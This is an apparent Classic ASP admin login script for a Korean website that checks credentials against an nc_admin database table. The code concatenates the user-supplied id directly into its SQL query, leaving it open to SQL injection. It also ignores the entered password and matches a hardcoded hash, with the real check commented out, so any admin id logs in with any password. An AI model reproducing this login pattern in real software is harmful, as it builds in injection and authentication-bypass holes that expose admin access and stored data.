<% @language="vbscript" codepage="65001" %>
<%	Option Explicit%>
<%
	session.lcid=1042	'default 2048
	session.codepage=65001	 '949
	response.charset="UTF-8"	'EUC-KR
	'response.contenttype="text/html; charset=UTF-8"
%>
<%	Response.Buffer= TRUE

	DIM ls_id,ls_pwd,ls_sql,lo_rs

	ls_id = LCase(Request("id"))
	ls_pwd= LCase(Request("pwd"))

	IF ls_id = "" OR ls_pwd = "" THEN
		Response.Write	"<script language='javascript'>		" & _
						"alert('아이디/비밀번호를 입력하세요!');	" & _
						"history.go(-1);					" & _
						"</script>															"
		Response.End
	ELSE

%>
		<!--#include file="../../config/adovbs.inc" -->
		<!--#include file="../../config/db_config.asp"-->
		<!--#include file="../inject1.asp"-->
<%
		ls_sql = " SELECT ad_no,ad_id,ad_pwd,ad_level				" & _
				 " FROM nc_admin									" & _
				 " WHERE ad_id = '"&ls_id&"' AND ad_pwd = '*89C6B530AA78695E257E55D63C00A6EC9AD3E977'	"
		'" WHERE ad_id = '"&ls_id&"' AND ad_pwd = password('"&ls_pwd&"')	"		 
		SET lo_rs = lo_DbCon.Execute(ls_sql)
		IF NOT lo_rs.EOF THEN
			Response.Write "등록회원입니다."
			SESSION("NICEMNGID") = lo_rs(1)
			SESSION("NICEMNGLV") = lo_rs(3)
			Response.Redirect "../admin_ok.asp?gb=main"

		ELSE
			Response.Write	"<script language='javascript'>	" & _
			"alert('등록된 회원이 아닙니다.!');					" & _
			"history.go(-1);								" & _
			"</script>										"
			Response.End
		END IF	
		lo_rs.Close:SET lo_rs = NOTHING
	END IF
	
%>
		<!--#include file="../../config/db_close.asp"-->
